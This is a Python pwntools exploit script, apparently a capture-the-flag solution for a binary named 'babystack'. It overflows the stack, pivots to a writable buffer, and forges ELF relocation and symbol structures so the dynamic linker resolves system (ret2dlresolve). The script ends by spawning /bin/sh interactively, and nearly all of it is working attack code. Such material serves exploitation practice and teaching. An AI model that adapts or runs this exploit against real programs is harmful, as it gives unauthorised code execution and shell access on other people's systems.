main_addr = 0x8048457
fun_addr = 0x804843b
read_plt = 0x8048300
read_got = 0x804a00c

from pwn import *

elf = ELF("./babystack")
p = elf.process()
# gdb.attach(p, gdbscript='b *0x8048455')

resolver = 0x80482f0	   # push link_map and call dl_resolve
buf = 0x804af00		   # controllable area | segment rw-p
leave_ret = 0x80483a8	   # 0x080483a8 : leave ; ret

# # readelf -d ./babystack
STRTAB = 0x804822c
SYMTAB = 0x80481cc
JMPREL = 0x80482b0

# Pivoting the stack and calling read(0, buf, 0x80) for the rest of the payload
buffer = ""
buffer += "A" * 40
buffer += p32(buf)	# stack pivoting. (esp = buff)
buffer += p32(elf.plt["read"]) + p32(leave_ret) 
buffer += p32(0) + p32(buf) + p32(0x80)

log.success("Length buffer: " + str(hex(len(buffer))))

# Compute offsets and forged structures
forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8	                  # size of elf32_sym

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) 	  # align to 0x10

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7

# fake st_name (sym_entry->st_name)
st_name = (elf32_sym + 0x10) - STRTAB

# fake struct "Elf32_Rel *rel_entry"
elf32_rel_struct = p32(elf.got["read"]) + p32(r_info)

# fake struct "Elf32_Sym *sym_entry"
elf32_sym_struct = p32(st_name) + p32(0) 
elf32_sym_struct += p32(0) + p32(0x12)

# Rest of the payload: dl-resolve hack :) (the real deal)
# buffer2 is input start buf = 0x804af00
buffer2 = "AAAA" 		  # fake ebp | leave ; ret = mov esp, ebp ; pop ebp ; pop eip
buffer2 += p32(resolver)	  # ret2dlresolve
buffer2 += p32(rel_offset)	  # JMPREL + offset = struct

# After first part of buffer2 resolver return function system  
buffer2 += "AAAA"		  # fake return of system 
buffer2 += p32(buf+100)		  # system parameter

# fake struct start "forged_ara = buf + 0x14
buffer2 += elf32_rel_struct	  # (buf+0x14)
buffer2 += "A" * align
buffer2 += elf32_sym_struct  	  # (buf+0x20)
buffer2 += "system\x00"

# align to addr "/bin/sh" = buf + 100 
length = (100 - len(buffer2))
buffer2 += "A" * length
buffer2 += "/bin/sh\x00"

# to length payload = 0x80
length = (0x80 - len(buffer2)) 
buffer2 += "A" * length

log.success("Length buffer2: " + str(hex(len(buffer2))))

payload = buffer + buffer2

p.sendline(payload) 
p.interactive()
